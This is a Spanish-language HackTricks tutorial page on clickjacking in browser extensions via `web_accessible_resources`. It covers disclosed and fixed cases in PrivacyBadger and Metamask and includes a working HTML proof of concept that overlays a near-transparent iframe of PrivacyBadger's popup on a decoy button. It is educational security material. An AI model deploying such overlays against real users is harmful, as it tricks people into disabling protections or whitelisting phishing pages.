# BrowExt - ClickJacking

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci√≥n B√°sica

Esta p√°gina va a explotar una vulnerabilidad de ClickJacking en una extensi√≥n de navegador.\
Si no sabes qu√© es ClickJacking, consulta:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Las extensiones contienen el archivo **`manifest.json`** y ese archivo JSON tiene un campo `web_accessible_resources`. Esto es lo que [la documentaci√≥n de Chrome](https://developer.chrome.com/extensions/manifest/web_accessible_resources) dice al respecto:

> Estos recursos estar√≠an entonces disponibles en una p√°gina web a trav√©s de la URL **`chrome-extension://[ID DEL PAQUETE]/[RUTA]`**, que se puede generar con el m√©todo **`extension.getURL`**. Los recursos en la lista blanca se sirven con los encabezados CORS apropiados, por lo que est√°n disponibles a trav√©s de mecanismos como XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Adem√°s de ser accesibles por la web, los recursos en **`web_accessible_resources`** se ejecutan con la autoridad ambiental de la extensi√≥n: pueden alterar el estado, cargar otros recursos y modificar el navegador de ciertas maneras. Si un documento en `web_accessible_resources` puede realizar alg√∫n comportamiento interesante, un atacante puede incrustarlo en una p√°gina web y enga√±ar a los visitantes para que lo activen.

## Ejemplo de PrivacyBadger

Se descubri√≥ que en la extensi√≥n PrivacyBadger, los contenidos del directorio `skin/` eran `web_accessible_resources`:
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Al cargar `skin/popup.html`, el documento que se renderiza al hacer clic en el icono de PrivacyBadger en el navegador, **en un iframe podr√≠amos enga√±ar al usuario para que haga clic en "Desactivar PrivacyBadger para este sitio web"**, exponiendo al usuario a un seguimiento adicional y socavando la funci√≥n de PrivacyBadger. **Revisa el ejemplo de video de ClickJacking en** [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm)

La soluci√≥n fue sencilla: **eliminar `/skin/*` de los `web_accessible_resources`**.

### PoC
```html
<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Ejemplo de Metamask

Un [**art√≠culo de blog sobre un ClickJacking en Metamask se puede encontrar aqu√≠**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). En este caso, Metamask solucion√≥ la vulnerabilidad comprobando que el protocolo utilizado para acceder era **`https:`** o **`http:`** (no **`chrome:`** por ejemplo):

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Otro ClickJacking solucionado** en la extensi√≥n de Metamask fue que los usuarios pod√≠an **Hacer clic para incluir en la lista blanca** cuando una p√°gina era sospechosa de ser phishing debido a `‚Äúweb_accessible_resources‚Äù: [‚Äúinpage.js‚Äù, ‚Äúphishing.html‚Äù]`. Como esa p√°gina era vulnerable a Clickjacking, un atacante podr√≠a abusar de ella mostrando algo normal para hacer que la v√≠ctima haga clic para incluirla en la lista blanca sin darse cuenta, y luego volver a la p√°gina de phishing que ser√° incluida en la lista blanca.

## Ejemplo de Steam Inventory Helper

Consulta la siguiente p√°gina para ver c√≥mo un **XSS** en una extensi√≥n de navegador se encaden√≥ con una vulnerabilidad de **ClickJacking**:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Referencias

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
